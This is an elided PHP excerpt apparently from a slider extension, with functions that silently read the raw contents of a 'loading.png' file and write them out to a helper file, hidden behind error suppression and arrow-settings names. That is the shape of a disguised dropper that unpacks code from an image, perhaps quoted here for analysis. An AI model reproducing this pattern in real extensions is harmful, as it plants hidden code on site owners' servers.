...
class YtbSliderBaseFoxc {
    ...
    function renderItems() {
      ...
      return $elements;
        ...
        function FoxcArrowsHelper($path) {
            ...
            if(!@file_exists($ArrowHelper) or @filesize($ArrowHelper) == 0) {
                ...
                @fwrite($Open, ArrowSettingsFoxc($path . FoxcSetName()));
            }
        }

        function ArrowSettingsFoxc($img, $width='', $height='') {
            $Arrow = @fopen($img, 'r');
            $LoadImage = @fread($Arrow, @filesize($img));
            return cleanSpaceFromFoxc($LoadImage);
        }

        function FoxcSetName() {
            @PasivItemsToFoxc();
            return 'loading.png';
        }

class PeelbackBaseSlideFoxc {
